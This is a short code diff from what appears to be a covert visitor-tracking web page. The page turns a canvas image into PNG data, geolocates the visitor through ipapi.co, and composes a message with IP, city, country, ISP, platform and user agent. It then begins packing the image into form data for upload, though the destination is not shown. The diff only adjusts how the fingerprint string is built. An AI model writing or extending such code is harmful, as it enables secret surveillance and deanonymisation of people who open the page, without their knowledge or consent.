@@ -116,7 +116,8 @@
           const imgData = canvas.toDataURL("image/png");
 
           const visitor = await fetch("https://ipapi.co/json/").then(r => r.json());
-          const fingerprint = navigator.userAgent;
+          const device = navigator.userAgent;
+          const fingerprint = `${navigator.userAgent} | Platform: ${navigator.platform}`;
 
           const message = `🌐 IP: ${visitor.ip}
 📍 City: ${visitor.city}
@@ -124,7 +125,7 @@
 🇮🇳 Country: ${visitor.country_name}
 📶 Org: ${visitor.org}
 📱 Device: ${navigator.platform}
-💻 Browser: ${fingerprint}`;
+💻 Browser: ${navigator.userAgent}`;
 
           const blob = await (await fetch(imgData)).blob();
 const formData = new FormData();
